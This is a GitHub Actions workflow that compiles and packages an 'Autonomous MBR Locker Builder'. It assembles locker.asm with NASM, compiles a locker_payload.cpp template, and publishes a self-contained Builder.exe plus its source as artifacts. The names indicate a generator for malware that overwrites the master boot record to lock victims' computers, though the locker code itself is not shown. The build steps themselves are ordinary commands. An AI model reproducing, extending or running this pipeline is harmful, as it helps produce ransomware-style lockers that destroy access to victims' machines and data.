name: Build Autonomous MBR Locker Builder

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Install MinGW (GCC for Windows)
      run: |
        choco install mingw -y
        echo "C:\tools\mingw64\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append

    - name: Download NASM
      run: |
        curl -L -o nasm.zip https://www.nasm.us/pub/nasm/releasebuilds/2.16.03/win64/nasm-2.16.03-win64.zip
        7z x nasm.zip -o. -y
        mkdir builder\Resources
        copy nasm-2.16.03\nasm.exe builder\Resources\nasm.exe
        echo [SUCCESS] NASM downloaded and copied to Resources

    - name: Copy locker.asm to Resources
      run: |
        copy locker\locker.asm builder\Resources\locker.asm
        echo [SUCCESS] locker.asm copied to Resources

    - name: Compile Template (locker_payload.exe)
      shell: cmd
      run: |
        set PATH=C:\tools\mingw64\bin;%PATH%
        cd template
        g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32
        if exist locker_payload.exe (
          copy locker_payload.exe ..\builder\Resources\template.exe
          echo [SUCCESS] Template compiled and copied to Resources
        ) else (
          echo [ERROR] Template compilation failed!
          exit /b 1
        )

    - name: Setup .NET
      uses: actions/setup-dotnet@v4
      with:
        dotnet-version: 6.0.x

    - name: Build Autonomous Builder (Self-Contained)
      shell: cmd
      run: |
        cd builder
        dotnet restore
        dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o ../output
        if exist ..\output\Builder.exe (
          echo [SUCCESS] Autonomous Builder built successfully
        ) else (
          echo [ERROR] Builder build failed!
          exit /b 1
        )

    - name: Upload Autonomous Builder
      uses: actions/upload-artifact@v4
      with:
        name: AutonomousMbrLockerBuilder
        path: |
          output/
          !output/*.pdb
        if-no-files-found: error

    - name: Upload Source Code
      uses: actions/upload-artifact@v4
      with:
        name: SourceCode
        path: |
          builder/
          locker/
          template/
          README.md
        if-no-files-found: warn
